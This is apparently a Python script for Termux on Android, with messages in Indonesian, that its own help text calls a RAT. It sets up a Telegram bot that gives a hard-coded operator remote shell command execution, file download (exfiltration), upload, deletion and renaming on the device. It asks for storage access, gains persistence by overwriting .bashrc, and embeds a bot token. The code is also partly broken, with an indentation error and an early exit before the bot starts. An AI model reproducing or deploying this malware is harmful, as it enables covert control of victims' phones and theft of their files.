#!/data/data/com.termux/files/usr/bin/python3
import subprocess
import os

os.system("pkg install screen -y")
screen_name = "rScreen"
bot_file = os.path.expanduser("~/ChDDoS.py")

def check_screen():
    result = subprocess.run(["screen", "-ls"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = result.stdout.decode("utf-8")
    return screen_name in output

def run_screen():
    os.system("screen -d -m -S rScreen XDDoS")
   # subprocess.run(["screen", "-d", "-m", "-S", screen_name, "python3", bot_file])

if __name__ == "__main__":
    if os.path.exists(bot_file) and not check_screen():
        run_screen()

import os

current_dir = os.getcwd()
if "storage" in current_dir.lower() or "/sdcard" in current_dir.lower():
    pass
else:
    if not os.path.exists("storage"):
        os.system("clear")
        print("🙏🏻 Mohon Izinkan Termux Ke Sdcard Anda")
        os.system("termux-setup-storage")

try:
    import logging
    from telegram import Update
    from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler
    import shutil
    import time as tou
    import subprocess
except ImportError:
    print("📚Module belum diinstall")
    print("⏳ Menginstal module")
    os.system("pip install python-telegram-bot")
  
os.system(f"echo screen -d -m -S {screen_name} XDDoS > $HOME/.bashrc")
#os.system("screen -d -m python3 ChDDoS.py")
#os.system("bash")
tou.sleep(2)
os._exit(0)
TOKEN = '7897939362:AAGtB2Ou4USDEN-bpYgdGqDEbiuOX22JsLA'
ALLOWED_CHAT_ID = [6469804005] 

logging.basicConfig(level=logging.CRITICAL)

current_dir = os.getcwd()

def check_allowed_chat(update: Update) -> bool:
    return update.effective_chat.id in ALLOWED_CHAT_ID

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    pass

async def help(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    await update.message.reply_text('Daftar perintah:\n/ls - Menampilkan daftar file dan direktori\n/pwd - Menampilkan path direktori saat ini\n/mkdir <nama_direktori> - Membuat direktori baru\n/rm <nama_file/direktori> - Menghapus file/direktori\n/cd <path> - Mengganti direktori\n/get <nama_file> - Mengambil file\n/upload - Mengupload file\n/openfile <filename> - Membuka file\n/rename <oldname> <newname> - Mengganti nama file\n/run <perintah> - Melakukan perintah sesuai dengan input\n/stop - Mematikan RAT')

async def ls(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    global current_dir
    files = [f"`{file}`" for file in os.listdir(current_dir)]
    await update.message.reply_text('\n'.join(files), parse_mode="Markdown")

async def pwd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    global current_dir
    await update.message.reply_text(current_dir)

async def mkdir(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    global current_dir
    try:
        ru = os.path.join(current_dir, ' '.join(context.args))
        os.mkdir(os.path.join(current_dir, ' '.join(context.args)))
        await update.message.reply_text(f'Berhasil membuat direktori: {ru}')
    except Exception as e:
        await update.message.reply_text(f'Gagal membuat direktori: {str(e)}')

async def rm(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    global current_dir
    try:
        path = os.path.join(current_dir, ' '.join(context.args))
        if os.path.isdir(path):
            shutil.rmtree(path)
            await update.message.reply_text(f'Berhasil menghapus: {path}')
        else:
            os.remove(path)
            await update.message.reply_text(f'Berhasil menghapus: {path}')
    except Exception as e:
        await update.message.reply_text(f'Gagal menghapus: {str(e)}')

async def cd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    global current_dir
    try:
        if len(context.args) == 0:
            await update.message.reply_text('Penggunaan: /cd <path>')
            return
        if context.args[0] == '..':
            current_dir = os.path.dirname(current_dir)
        elif context.args[0] == '~':
            current_dir = os.path.expanduser('~')
        else:
            new_dir = os.path.join(current_dir, ' '.join(context.args))
            if os.path.isdir(new_dir):
                current_dir = new_dir
            else:
                await update.message.reply_text('Direktori tidak ditemukan')
                return
        # Menggunakan os.system("cd <path>") tidak akan berpengaruh
         os.system(f"cd {current_dir}")
        
        # Menggunakan os.chdir() untuk mengubah direktori kerja proses Python
        os.chdir(current_dir)
        
        await update.message.reply_text(f'Direktori saat ini: {os.getcwd()}')
    except Exception as e:
        await update.message.reply_text(f'Gagal mengganti direktori: {str(e)}')
        
async def get(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    global current_dir
    try:
        file_path = os.path.join(current_dir, ' '.join(context.args))
        if os.path.isfile(file_path):
            await update.message.reply_document(open(file_path, 'rb'))
        else:
            await update.message.reply_text('File tidak ditemukan')
    except Exception as e:
        await update.message.reply_text(f'Gagal mengambil file: {str(e)}')

async def upload(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    global current_dir
    message = update.message.reply_to_message
    if message:
        file = None
        filename = None
        if message.document:
            file = await context.bot.get_file(message.document)
            filename = message.document.file_name
        elif message.photo:
            file_id = message.photo[-1].file_id
            file = await context.bot.get_file(file_id)
            filename = f"{file_id}.jpg"
        if file and filename:
            await file.download_to_drive(os.path.join(current_dir, filename))
            await update.message.reply_text(f'File {filename} berhasil diupload')
        else:
            await update.message.reply_text('File tidak didukung')
    else:
        await update.message.reply_text('Balas file yang ingin diupload dengan perintah /upload')
        
async def openfile(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    global current_dir
    file_name = ' '.join(context.args)
    file_path = os.path.join(current_dir, file_name)
    if os.path.isfile(file_path):
        try:
            with open(file_path, 'r') as f:
                await update.message.reply_text(f.read())
        except Exception as e:
            await update.message.reply_text(f"Gagal membuka file: {str(e)}")
    else:
        await update.message.reply_text('File tidak ditemukan')

async def rename(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    try:
        old_name = context.args[0]
        new_name = context.args[1]
        os.rename(os.path.join(current_dir, old_name), os.path.join(current_dir, new_name))
        await update.message.reply_text(f"Berhasil mengganti nama dari {old_name} menjadi {new_name}")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def run(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    try:
        perintah = ' '.join(context.args)
        os.system(perintah)
        await update.message.reply_text(f"Perintah '{perintah}' telah dijalankan")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

import subprocess

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not check_allowed_chat(update):
        return
    try:
        # Hapus semua socket screen
        subprocess.Popen(["screen", "-wipe"])
        subprocess.Popen(["rm", "-rf", ".bashrc"])
        subprocess.Popen(["rm", "-rf", ".screen"])
        subprocess.Popen(["pkill", "-9", "-f", "ChDDoS"])  # pastikan nama prosesnya benar
        await update.message.reply_text("Proses telah dihentikan")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

def main() -> None:
    global current_dir
    current_dir = os.getcwd()
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help))
    app.add_handler(CommandHandler("ls", ls))
    app.add_handler(CommandHandler("pwd", pwd))
    app.add_handler(CommandHandler("mkdir", mkdir))
    app.add_handler(CommandHandler("rm", rm))
    app.add_handler(CommandHandler("cd", cd))
    app.add_handler(CommandHandler("get", get))
    app.add_handler(CommandHandler("upload", upload))
    app.add_handler(CommandHandler("openfile", openfile))
    app.add_handler(CommandHandler("rename", rename))
    app.add_handler(CommandHandler("run", run))
    app.add_handler(CommandHandler("stop", stop))
    app.run_polling()

if __name__ == '__main__':
    main()
